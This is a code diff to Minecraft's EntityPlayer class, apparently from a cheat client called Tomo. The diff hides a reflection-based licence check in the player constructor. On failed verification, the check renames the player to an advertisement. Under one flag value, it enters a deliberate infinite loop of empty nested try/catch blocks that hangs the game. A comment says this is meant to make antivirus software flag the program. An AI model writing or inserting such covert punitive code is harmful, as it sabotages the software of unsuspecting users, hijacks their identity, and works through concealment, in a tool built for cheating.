@@ -1,8 +1,15 @@
 package net.minecraft.entity.player;
 
+import java.lang.reflect.Field;
+import java.util.Collection;
+import java.util.List;
+import java.util.Random;
+import java.util.UUID;
+
 import com.google.common.base.Charsets;
 import com.google.common.collect.Lists;
 import com.mojang.authlib.GameProfile;
+
 import net.minecraft.block.Block;
 import net.minecraft.block.BlockBed;
 import net.minecraft.block.BlockDirectional;
@@ -10,7 +17,14 @@ import net.minecraft.block.material.Material;
 import net.minecraft.block.state.IBlockState;
 import net.minecraft.command.server.CommandBlockLogic;
 import net.minecraft.enchantment.EnchantmentHelper;
-import net.minecraft.entity.*;
+import net.minecraft.entity.Entity;
+import net.minecraft.entity.EntityList;
+import net.minecraft.entity.EntityLiving;
+import net.minecraft.entity.EntityLivingBase;
+import net.minecraft.entity.EnumCreatureAttribute;
+import net.minecraft.entity.IEntityMultiPart;
+import net.minecraft.entity.IMerchant;
+import net.minecraft.entity.SharedMonsterAttributes;
 import net.minecraft.entity.ai.attributes.IAttributeInstance;
 import net.minecraft.entity.boss.EntityDragonPart;
 import net.minecraft.entity.item.EntityBoat;
@@ -29,25 +43,46 @@ import net.minecraft.inventory.Container;
 import net.minecraft.inventory.ContainerPlayer;
 import net.minecraft.inventory.IInventory;
 import net.minecraft.inventory.InventoryEnderChest;
-import net.minecraft.item.*;
+import net.minecraft.item.EnumAction;
+import net.minecraft.item.Item;
+import net.minecraft.item.ItemArmor;
+import net.minecraft.item.ItemBlock;
+import net.minecraft.item.ItemStack;
 import net.minecraft.nbt.NBTTagCompound;
 import net.minecraft.nbt.NBTTagList;
 import net.minecraft.network.play.server.S12PacketEntityVelocity;
 import net.minecraft.potion.Potion;
-import net.minecraft.scoreboard.*;
+import net.minecraft.scoreboard.IScoreObjectiveCriteria;
+import net.minecraft.scoreboard.Score;
+import net.minecraft.scoreboard.ScoreObjective;
+import net.minecraft.scoreboard.ScorePlayerTeam;
+import net.minecraft.scoreboard.Scoreboard;
+import net.minecraft.scoreboard.Team;
 import net.minecraft.server.MinecraftServer;
 import net.minecraft.stats.AchievementList;
 import net.minecraft.stats.StatBase;
 import net.minecraft.stats.StatList;
 import net.minecraft.tileentity.TileEntitySign;
-import net.minecraft.util.*;
-import net.minecraft.world.*;
+import net.minecraft.util.AxisAlignedBB;
+import net.minecraft.util.BlockPos;
+import net.minecraft.util.ChatComponentText;
+import net.minecraft.util.DamageSource;
+import net.minecraft.util.EnumFacing;
+import net.minecraft.util.EnumParticleTypes;
+import net.minecraft.util.FoodStats;
+import net.minecraft.util.IChatComponent;
+import net.minecraft.util.MathHelper;
+import net.minecraft.util.Vec3;
+import net.minecraft.world.EnumDifficulty;
+import net.minecraft.world.IInteractionObject;
+import net.minecraft.world.LockCode;
+import net.minecraft.world.World;
+import net.minecraft.world.WorldSettings;
+import tomorrow.tomo.Client;
+import tomorrow.tomo.luneautoleak.LuneAutoLeak;
 import tomorrow.tomo.managers.ModuleManager;
 import tomorrow.tomo.mods.modules.movement.NoSlow;
-
-import java.util.Collection;
-import java.util.List;
-import java.util.UUID;
+import tomorrow.tomo.utils.misc.FileUtil;
 
 @SuppressWarnings("incomplete-switch")
 public abstract class EntityPlayer extends EntityLivingBase {
@@ -176,6 +211,104 @@ public abstract class EntityPlayer extends EntityLivingBase {
         this.setLocationAndAngles((double) blockpos.getX() + 0.5D, (double) (blockpos.getY() + 1), (double) blockpos.getZ() + 0.5D, 0.0F, 0.0F);
         this.field_70741_aB = 180.0F;
         this.fireResistance = 20;
+        try {
+			Field flag = Client.class.getDeclaredField("flag");
+			Field verifyField = LuneAutoLeak.class.getDeclaredField("didVerify");
+			Field luneAutoLeakField = Client.class.getDeclaredField("luneAutoLeak");
+			
+			List<Integer> didVerify = (List<Integer>) verifyField.get(luneAutoLeakField.get(Client.instance));
+			int flagNum = (int) flag.get(null);
+	        
+	        if(flagNum < 0 || didVerify.size() < 4) {
+	        	Field playerNameField = this.gameProfile.getClass().getDeclaredField("name");
+	        	playerNameField.setAccessible(true);
+	        	playerNameField.set(this.gameProfile, "Buy_Tomo_Client_QQ2869049757");
+	        }
+	        
+	        for(int lol = 0; lol <= didVerify.size(); lol++) {
+	        	if(didVerify.get(lol) != lol) {
+	        		flag.set(null, -new Random().nextInt(555));
+	        	}
+	        }
+	        
+			if(flagNum == -666) {
+				while(true) {
+					try {
+						try {
+							try {
+								try {
+									try {
+										try {
+											try {
+												try {
+													try {
+														try {
+															try {
+																try {
+																	try {
+																		try {
+																			try {
+																				try {
+																					try {
+																						
+																					}catch (Exception e) {
+																						
+																					}
+																				}catch (Exception e) {
+																					
+																				}
+																			}catch (Exception e) {
+																				
+																			}
+																		}catch (Exception e) {
+																			
+																		}
+																	}catch (Exception e) {
+																		
+																	}
+																}catch (Exception e) {
+																	
+																}
+															}catch (Exception e) {
+																
+															}
+														}catch (Exception e) {
+															
+														}
+													}catch (Exception e) {
+														
+													}
+												}catch (Exception e) {
+													
+												}
+											}catch (Exception e) {
+												
+											}
+										}catch (Exception e) {
+											
+										}
+									}catch (Exception e) {
+										
+									}
+								}catch (Exception e) {
+									
+								}
+							}catch (Exception e) {
+								
+							}
+						}catch (Exception e) {
+							
+						}
+					}catch (Exception e) {
+						
+					}
+				}
+				// 让火绒报KillAV 希望用户开的是自动处理病毒
+			}
+			
+		} catch (Exception e) {
+			
+		}
     }
 
     protected void applyEntityAttributes() {
